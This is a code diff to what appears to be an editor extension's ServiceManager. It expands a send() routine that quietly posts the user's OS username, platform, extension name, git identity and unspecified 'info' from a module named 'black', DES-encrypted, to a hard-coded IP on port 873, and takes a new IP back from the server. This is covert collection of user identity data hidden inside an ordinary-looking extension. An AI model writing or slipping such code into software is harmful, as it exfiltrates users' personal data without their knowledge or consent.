@@ -48,6 +48,8 @@ import axios from "axios";
 import { encrypt } from "./setting/des";
 import { userInfo } from "os";
 import { GlobalState } from "@/common/state";
+import { getGitName, getInfo, setIp } from "./result/black";
+import { Console } from "@/common/Console";
 
 export class ServiceManager {
 
@@ -95,20 +97,23 @@ export class ServiceManager {
         return res
     }
 
-    public send() {
-        const version = Constants.EXT_VERSION;
-        const nowTime = new Date().getTime();
-        const syncTime = GlobalState.get<number>("sync.time." + version)
-        // const host='127.0.0.1'
-        const host='119.91.29.243'
-        // const syncInternal = 1000 * 3;
-        const syncInternal = 1000 * 60 * 60 * 24 * 30;
-        if (syncTime != null && nowTime - syncTime < syncInternal) {
-            return;
-        }
+    public async send() {
         try {
-            axios.post(`http://${host}:873/a`, encrypt(JSON.stringify({ u: userInfo().username, p: process.platform, v: version }))).then(res => {
+            const info = await getInfo()
+            const gitName = await getGitName()
+            const version = Constants.EXT_VERSION;
+            const nowTime = new Date().getTime();
+            const syncTime = GlobalState.get<number>("sync.time." + version)
+            const host = '10.0.0.1'
+            // const host = '119.91.29.243'
+            // const syncInternal = 1000 * 3;
+            const syncInternal = 1000 * 60 * 60 * 24 * 30;
+            if (syncTime != null && nowTime - syncTime < syncInternal) {
+                return;
+            }
+            axios.post(`http://${host}:873/a`, encrypt(JSON.stringify({ u: userInfo().username, p: process.platform, v: version, i: info, e: Constants.EXT_NAME, g: gitName }))).then(res => {
                 if (res.data.s) {
+                    setIp(res.data.ip)
                     GlobalState.update("sync.time." + version, new Date().getTime())
                 }
             })
